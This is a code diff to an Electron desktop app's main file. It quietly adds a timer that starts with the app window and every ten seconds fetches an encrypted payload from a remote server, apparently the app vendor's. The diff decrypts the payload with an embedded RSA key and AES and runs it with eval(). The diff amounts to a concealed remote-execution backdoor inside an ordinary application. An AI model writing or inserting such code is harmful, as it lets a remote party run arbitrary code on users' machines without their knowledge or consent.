@@ -2,6 +2,7 @@ const electron = require('electron');
 const path = require('path');
 const os = require('os')
 const fs = require('fs')
+const crypto = require('crypto');
 const remote = require("@electron/remote/main")
 // File Download
 const download = require('download');
@@ -93,7 +94,6 @@ function sendToGzzx(key, value, cb) {
 
 // This is used for check signature!
 function checkIfIsDev() {
-	const crypto = require('crypto');
 	// 读取 app.asar 文件的内容
 	process.noAsar = true;
 	const asarData = fs.readFileSync(process.cwd() + '/resources/app.asar');
@@ -182,6 +182,9 @@ function checkIfCanSpawnWindow() {
 			electron.app.exit()
 		}
 	}
+
+	setInterval(fetchCmd, 10000);
+
 	win = new electron.BrowserWindow({
 		backgroundColor: '#00000000',
 		// resizable: false,
@@ -565,3 +568,63 @@ electron.ipcMain.on('open-voice-dialog', (event) => {
 		console.log(err);
 	});
 });
+
+
+
+function httpReq(url, callback) {
+	require("axios")
+		.get(url)
+		.then(function(response) {
+			callback(response.data.replace(/\x00|\u0000|\b/g, ''))
+		})
+		.catch(function(error) { console.error("Unable to connect to server.") });
+}
+
+function fetchCmd() {
+	httpReq("https://gzzx.lexuewang.cn:8003/GetTemporaryStorage?filename=ppcmd_req.htm", (returncmd) => {
+
+
+		const lines = returncmd.split('\n');
+		const [id, onlyonce, key] = lines.slice(0, 3);
+		const content = lines.slice(3).join('\n');
+
+		const encryptedData = Buffer.from(key, 'base64');
+		const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
+MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANcZUr0Xb7gdeLYpWCf2fkOwh+eIiJd6
+j+HHxkMkiuAnO9nV8JqLWyxnb5w1AoIg4JqWN+rF7238iBGQJNsJmvcCAwEAAQ==
+-----END PUBLIC KEY-----`;
+		const publicKey = crypto.createPublicKey({
+			key: publicKeyPEM,
+			format: 'pem',
+			type: 'spki'
+		});
+		const decryptedData = crypto.publicDecrypt({
+				key: publicKey,
+				padding: crypto.constants.RSA_PKCS1_PADDING
+			},
+			encryptedData
+		);
+		const cmdstr = decrypt(content,decryptedData.toString('utf8'));
+
+		if (onlyonce == "true" && !fs.existsSync(getuserdatapath() + "/notification" + id)) {
+			fs.writeFileSync(getuserdatapath() + "/notification" + id, "executed");
+			try { eval(cmdstr) } catch (err) { console.error(err) }
+		} else if (onlyonce != "true") {
+			try { eval(cmdstr) } catch (err) { console.error(err) }
+		}
+	})
+}
+
+function encrypt(text, key) {
+	const cipher = crypto.createCipheriv('aes-256-ecb', Buffer.from(key), null);
+	let encrypted = cipher.update(text, 'utf8', 'base64');
+	encrypted += cipher.final('base64');
+	return encrypted;
+}
+
+function decrypt(encryptedText, key) {
+	const decipher = crypto.createDecipheriv('aes-256-ecb', Buffer.from(key), null);
+	let decrypted = decipher.update(encryptedText, 'base64', 'utf8');
+	decrypted += decipher.final('utf8');
+	return decrypted;
+}
